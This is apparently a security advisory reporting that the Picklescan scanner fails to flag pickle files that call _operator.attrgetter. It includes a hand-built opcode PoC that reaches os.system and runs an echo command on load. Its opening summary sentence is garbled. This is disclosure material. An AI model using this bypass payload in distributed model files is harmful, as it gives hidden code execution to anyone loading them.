summary: "Picklescan is vulnerable to RCE via missing detection when calling built-in python\
  \ _operator.attrgetter\n### Summary\nPicklescan uses _operator.attrgetter, which is a built-in\
  \ python library function to execute remote pickle files.\n\n### Details\nThe attack payload\
  \ executes in the following steps:\n\n- First, the attacker crafts the payload by calling\
  \ the _operator.attrgetter function in the reduce method.\n- Then, when the victim, after\
  \ checking whether the pickle file is safe by using the Picklescan library and finding that\
  \ this library doesn't detect any dangerous functions, decides to call pickle.load() on this\
  \ malicious pickle file, it leads to remote code execution.\n\n### PoC\n```\nimport pickle\n\
  import pickletools\nopcode3 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0c_operator\nattrgetter\n\
  (Vsystem\ntR(g0\ntR(Vecho \"pwned by _operator.attrgetter\"\ntR.'''\npickletools.dis(opcode3)\n\
  pickle.loads(opcode3)\n```\nThis PoC can't be easily create by pickle.dumps, so it was manually\
  \ built. \n\n### Impact\nAny organization or individual relying on picklescan to detect malicious\
  \ pickle files inside PyTorch models.\nAttackers can embed malicious code in pickle file that\
  \ remains undetected but executes when the pickle file is loaded.\nAttackers can distribute\
  \ infected pickle files across ML models, APIs, or saved Python objects.\n\n### Report by\n\
